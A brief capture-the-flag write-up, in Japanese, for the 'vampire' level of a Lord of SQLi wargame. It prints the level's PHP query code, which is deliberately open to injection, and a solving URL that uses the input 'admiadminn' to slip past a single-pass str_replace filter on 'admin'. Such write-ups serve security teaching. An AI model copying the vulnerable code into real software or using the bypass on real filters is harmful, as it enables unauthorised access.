# vampire

## answer

```
https://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=admiadminn
```

## problem

```
query : select id from prob_vampire where id=''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~"); 
  $_GET[id] = str_replace("admin","",$_GET[id]); 
  $query = "select id from prob_vampire where id='{$_GET[id]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("vampire"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=1
```

とすると

```
query : select id from prob_vampire where id='1'
```

となった。

コードを読んでいく。

```
$_GET[id] = str_replace("admin","",$_GET[id]); 
```

adminという文字列がサニタイズされている。

しかし、str_resplaceは再帰的には置き換えないため、こんな感じ？

```
https://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=admiadminn
```

```
query : select id from prob_vampire where id='admin'
```

とれた。

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [str_replace | php manual](https://www.php.net/manual/ja/function.str-replace.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)